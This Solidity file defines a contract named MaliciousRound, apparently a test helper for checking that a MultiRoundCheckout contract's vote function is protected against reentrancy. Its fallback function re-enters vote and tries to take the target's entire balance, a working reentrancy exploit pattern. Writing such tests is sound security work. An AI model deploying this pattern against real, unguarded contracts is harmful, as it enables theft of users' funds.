// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./MultiRoundCheckout.sol";

contract MaliciousRound {
    MultiRoundCheckout private targetContract;
    bool public hasReentered = false;

    constructor(address _targetContract) {
        targetContract = MultiRoundCheckout(_targetContract);
    }

    /* A reentrancy attack would be possible if the vote function was not guarded 
    against reentrancy and we would know how much excess funds the user sent.
    Then we could drain the excess funds to our malicious round */
    fallback() external payable {
        if (hasReentered) {
            return;
        }
        // Perform the reentrancy attack
        address[] memory rounds = new address[](1);
        rounds[0] = address(this);
        bytes[][] memory votes = new bytes[][](1);
        uint256[] memory values = new uint256[](1);
        /* Scoop up whatever will be left after all the votes are cast */
        values[0] = address(targetContract).balance + msg.value;

        hasReentered = true;
        targetContract.vote{value: msg.value}(votes, rounds, values);
    }
}
